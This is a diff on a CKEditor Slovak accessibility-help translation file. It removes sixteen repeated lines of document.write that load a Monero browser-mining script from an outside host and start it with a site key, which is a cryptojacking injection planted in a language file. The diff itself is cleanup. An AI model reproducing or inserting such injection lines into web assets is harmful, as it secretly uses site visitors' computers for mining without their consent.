@@ -10,19 +10,3 @@ CKEDITOR.plugins.setLang("a11yhelp","sk",{title:"Inštrukcie prístupnosti",cont
 {name:"Prejsť na ďalší ",legend:"Stlačte ${accessNextSpace} pre prístup na najbližšie nedosiahnuteľné zamerateľné medzery po vsuvke. Napríklad: dve za sebou idúce horizontálne čiary. Opakujte kombináciu klávesov pre dosiahnutie vzdialených zamerateľných medzier."},{name:"Pomoc prístupnosti",legend:"Stlačte ${a11yHelp}"}]}],backspace:"Backspace",tab:"Tab",enter:"Enter",shift:"Shift",ctrl:"Ctrl",alt:"Alt",pause:"Pause",capslock:"Caps Lock",escape:"Escape",pageUp:"Stránka hore",pageDown:"Stránka dole",
 end:"End",home:"Home",leftArrow:"Šípka naľavo",upArrow:"Šípka hore",rightArrow:"Šípka napravo",downArrow:"Šípka dole",insert:"Insert","delete":"Delete",leftWindowKey:"Ľavé Windows tlačidlo",rightWindowKey:"Pravé Windows tlačidlo",selectKey:"Tlačidlo Select",numpad0:"Numpad 0",numpad1:"Numpad 1",numpad2:"Numpad 2",numpad3:"Numpad 3",numpad4:"Numpad 4",numpad5:"Numpad 5",numpad6:"Numpad 6",numpad7:"Numpad 7",numpad8:"Numpad 8",numpad9:"Numpad 9",multiply:"Násobenie",add:"Sčítanie",subtract:"Odčítanie",
 decimalPoint:"Desatinná čiarka",divide:"Delenie",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"Scroll Lock",semiColon:"Bodkočiarka",equalSign:"Rovná sa",comma:"Čiarka",dash:"Pomĺčka",period:"Bodka",forwardSlash:"Lomítko",graveAccent:"Zdôrazňovanie prízvuku",openBracket:"Hranatá zátvorka otváracia",backSlash:"Backslash",closeBracket:"Hranatá zátvorka zatváracia",singleQuote:"Jednoduché úvodzovky"});
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
